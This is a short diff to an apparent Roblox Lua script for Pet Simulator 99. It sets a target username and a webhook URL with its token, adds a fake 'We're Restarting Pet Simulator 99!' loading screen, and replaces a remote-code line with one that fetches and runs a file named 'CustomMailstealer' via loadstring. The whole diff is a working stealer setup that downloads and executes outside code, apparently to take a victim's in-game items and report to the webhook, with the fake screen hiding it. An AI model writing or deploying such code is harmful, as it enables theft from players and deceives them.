@@ -1,5 +1,7 @@
 Username = "samuraikid0221"
 Webhook = "https://webhook.lewistehminerz.dev/api/webhooks/1198780376643018793/cp6mgWXuxiPwCCqUA4OG-oXY9gOBnVxW8PD5hwoSoebWCewsIbGr1RTWBkPju1x4u6Gt"
-LoadingScreen = true
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+G_LoadingScreen = "We're Restarting Pet Simulator 99!"
+G_WebhookName = "PS99"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
